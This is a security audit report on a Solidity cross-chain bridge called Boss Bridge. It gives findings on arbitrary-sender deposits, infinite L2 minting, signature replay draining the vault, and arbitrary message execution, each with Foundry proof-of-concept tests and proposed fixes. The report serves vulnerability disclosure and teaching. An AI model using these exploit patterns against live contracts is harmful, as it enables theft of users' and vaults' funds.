### [H-1] The parameter `address from` in `L1BoossBridge::depositTokensToL2` function can be called arbitrarily by anyone, user funds can be stolen.

**Description:** This parameter `from` is the address where an amount will be transfered to the `vault` of `L1` to then receive the minted L2 tokens respectively. To execute the function `depositTokensToL2` first you need to execute an `approve` function with the `L1 tokens` so the `bridge` can take from your funds. After you called the `approve` function, the time between you call `approve` and `depositTokensToL2` anyone can call `depositTokensToL2` with your funds and receive the `L2 tokens` for themselves.

**Impact:** Potential loose of funds from the user that executes `approve`.

**Proof of Concept:** PoC

1. The `user` approves the L1 token to deposit.
2. The `attacker` calls `depositTokensToL2` with money of the `user` and receive `L2 tokens` for himself.

<details>
<summary>Code</summary>

```javascript
function testl1TokensCanBeDepositedByArbitraryUserOnceApproved() public {
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        uint256 amountToDeposit = token.balanceOf(user);
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attacker, amountToDeposit);
        tokenBridge.depositTokensToL2(user, attacker, amountToDeposit);

        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(address(vault)), amountToDeposit);
    }
```

</details>

**Recommended Mitigation:** Don't make the `from` parameter arbitrary, you can withdraw from the one that calls the function.


### [H-2] Using the `L1 vault` funds to deposit to itself can cause infinite minting of `L2 tokens`

**Description:** As the parameter `address from` from `L1BoossBridge::depositTokensToL2` is arbitrary you can use that to deposit from the `vault` to the `vault` itself to receive `L2 tokens`. 

**Impact:** A couple:
- Misconfiguration of balances of `L1 vault` and `L2 vault`.
- Infinite minting of `L2 tokens`.

**Proof of Concept:**PoC
1. Some user deposits to the `vault`.
2. The `attacker` uses the balance of the `vault` to get the corresponding `L2 tokens`.
3. Deposit is successful.
4. The balance of the `vault` didn't change but the attacker got the `L2 tokens`.

<details>
<summary>Test</summary>

```javascript
function testAttackerCanMintInfiniteL2TokensWithoutPaying () public {
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);
        uint256 amountToDeposit = token.balanceOf(user);
        tokenBridge.depositTokensToL2(user, user, amountToDeposit);

        uint256 amountToSteal = token.balanceOf(address(vault));
        address attacker = makeAddr("attacker");

        // We try to get minted L2 tokens using the balance of the vault
        // Can do this forever and mint infinite tokens from L2
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), attacker, amountToSteal);
        tokenBridge.depositTokensToL2(address(vault), attacker, amountToSteal);

        assert(token.balanceOf(address(vault)) != amountToDeposit + amountToSteal);
        // The balance should be the same as the user deposited but the tokens minted now are doubled with
        // the same balance
        assertEq(token.balanceOf(address(vault)), amountToDeposit);
    }
```
</details>

**Recommended Mitigation:** Filter with a modifier or something similar the address of the vault to avoid using the tokens from vault itself. Consider adding the follwing lines.
```diff
+ error L1BossBridge__InvalidAddress();
+ modifier checkInvalidAddress(address _from) {
+       if (_from == address(vault)) {
+       revert L1BossBridge__InvalidAddress();
+ }
}
```

And add this modifier to the proper function.


### [H-3] Potential signature replay attack on function `L1BossBridge::withdrawTokensToL1`.

**Description:** To withdraw tokens to L1 (so the inverse of the `depositTokensToL2` function), you are supposed to make a request to the operator that have to sign the  withdrawal before it can be done. Once the message that allows you to withdraw is signed, then you or the operator executes the message signed on `L1BossBridge::withdrawTokensToL1` using the `v`, `r`, `s`(parts of the signature), `to` and `amount`.
NOTE: you have to put the exact parameters `to` `amount` as in the message signed, if not it won't work.
The problems comes after the withdrawal, when is successful, then you can use the same signature to execute the withdrawal multiple times till you drain the contract.

<details>
<summary>Function `withdrawTokensToL1`</summary>

```javascript
function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
        sendToL1(
            v,
            r,
            s,
            abi.encode(
                address(token),
                0, // value
                abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
            )
        );
    }
```
</details>

**Impact:** Loose of all or some funds (depends if ti can be paused) of the L1 vault.

**Proof of Concept:** PoC
1. Assume we start with some balance on the `vault` and the `attacker` account.
2. `attacker` deposits all his balance.
3. `attacker` requests the withdrawal.
4. `message` is  created and signed with the exact parameters requested.
5. `attacker` makes the withdrawal repeatidly till drain the contract the `vault`.

<details>
<summary>Test</summary>

```javascript
function testSignatureReplay() public {
        address attacker = makeAddr("attacker");
        uint256 attackerInitialBalance = 100e18;
        uint256 vaultInitialBalance = 1000e18;

        deal(address(token), address(vault), vaultInitialBalance);
        deal(address(token), attacker, attackerInitialBalance);

        // An attacker deposits some to L2
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);

        // The attacker request some withdraw to L1 so the signer has to do the transaction
        
        
        // Operator is going to sign the withdrawal
        bytes memory message = abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));

        while (token.balanceOf(address(vault)) > 0) {
            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
        }

        assertEq(token.balanceOf(attacker), vaultInitialBalance + attackerInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);
    }
```
</details>

**Recommended Mitigation:** Consider adding some data to the function that can only be used one time. Like a `nonce` or a `timestamp`.

### [H-4] Function `L1BossBridge::sendToL1` you can send arbitrary `messages` causing an undesired excution of functions.

**Description:** The function `sendToL1` is used by the function `withdrawTokensToL1` to withdraw from L2 to L1 tokens. The `message` parameter on the function `sendToL1` is created on `withdrawTokensToL1` function. But the problem resides on the visibility of the function, anyone can call `sendToL1` with a random message, so if somehow you get a corrupt message signed by an operator you can execute it  directly on the function `sendToL1` and get it done.

<details>
<summary>`sendToL1` function</summary>

```javascript
function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
        address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

        if (!signers[signer]) {
            revert L1BossBridge__Unauthorized();
        }

        (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));

        (bool success,) = target.call{ value: value }(data);
        if (!success) {
            revert L1BossBridge__CallFailed();
        }
    }
```
</details>

You also can make a `gas bomb` playing with the arbitrary messages. Not draining the contract but make the operator to spend a large amount of gas. Same root cause.

**Impact:** Undesired execution of functions inside the `message` parameter.

**Proof of Concept:**PoC
1. `Attacker` deposits, and vault has already an initial balance.
2. You create a corrupt message that instead of withdrawing your balance from L2, you withdraw all the funds from the vault.
3. Somehow you got it signed.
4. Execute it directly on `sendToL1` function and drain the contract.

<details>
<summary>test</summary>

```javascript
function testSendArbitraryMessagesSendToL1Function() public {
        address attacker = makeAddr("attacker");
        uint256 attackerInitialBalance = 100e18;
        uint256 vaultInitialBalance = 1000e18;

        deal(address(token), address(vault), vaultInitialBalance);
        deal(address(token), attacker, attackerInitialBalance);

        // An attacker deposits some to L2
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);

        // The attacker request some withdraw to L1 so the signer has to do the transaction
        
        
        // We create a corrupt message to drain the vault
        bytes memory message = abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, token.balanceOf(address(vault)))));

        // The operator signs it without knowing it
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
        
        // We can use this signature to call sendToL1 function and drain the vault
        tokenBridge.sendToL1(v, r, s, message);
    

        assertEq(token.balanceOf(attacker), vaultInitialBalance + attackerInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);

    }
```
</details>

**Recommended Mitigation:** You can change the visibility of the function `senToL1` put it `internal` or `private`.


### [H-5] `TokenFactory::deployToken` function is not `EVM compatible` if you deploy it in ZKSync Era.

**Description:** According to the `Readme` of the protocol `Boss Bridge` says that the contract `TokenFactory` will be deployed on ZKSync Era but if you go to the docs of `ZKSync Era` you can read that in order to use `create` or `create2` to deploy a contract is preferably to know the bytecode of the contract beforehand. Thus, `deployToken` function don't know the bytecode beforehand so probably will fail on `ZKSync Era`.

<details>
<summary>`deployToken` function</summary>

```javascript
function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
        assembly {
            addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
        }
        s_tokenToAddress[symbol] = addr;
        emit TokenDeployed(symbol, addr);
    }
```
</details>

**Impact:** Failure of deployment of tokens.

**Recommended Mitigation:** Consider adding the following lines:

```diff
-function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr)
+function deployToken(string memory symbol) public onlyOwner returns (address addr) {
+        bytes memory contractBytecode = type(MyContract).creationCode;
        assembly {
-           addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
+           addr := create2(0, add(contractBytecode, 0x20), mload(contractBytecode))
        }
        s_tokenToAddress[symbol] = addr;
        emit TokenDeployed(symbol, addr);
}
```